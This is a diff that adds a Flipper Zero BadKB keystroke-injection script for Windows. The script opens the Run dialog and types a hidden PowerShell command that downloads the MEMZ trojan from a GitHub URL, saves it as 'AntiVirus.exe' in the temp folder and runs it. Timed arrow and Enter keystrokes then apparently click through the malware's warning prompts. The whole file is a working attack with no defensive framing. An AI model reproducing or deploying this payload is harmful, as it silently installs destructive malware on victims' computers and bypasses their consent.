@@ -1,0 +1,31 @@
+REM Flipper/BadKB/Windows/Memz_Windows
+
+DELAY 1000
+GUI r
+
+STRING powershell -windowstyle hidden -Command "Invoke-WebRequest -Uri 'https://github.com/vvinlind/MEMZ/raw/master/MEMZ.exe' -OutFile '%temp%\AntiVirus.exe'" & start /b "" "%temp%\AntiVirus.exe"
+
+DELAY 9000
+ENTER
+
+DELAY 1500
+GUI r
+
+DELAY 2000
+
+STRING start %temp%\AntiVirus.exe
+
+DELAY 5500
+ENTER
+
+DELAY 4500
+
+LEFTARROW
+DELAY 1500
+ENTER
+
+DELAY 5000
+LEFTARROW
+
+DELAY 1500
+ENTER
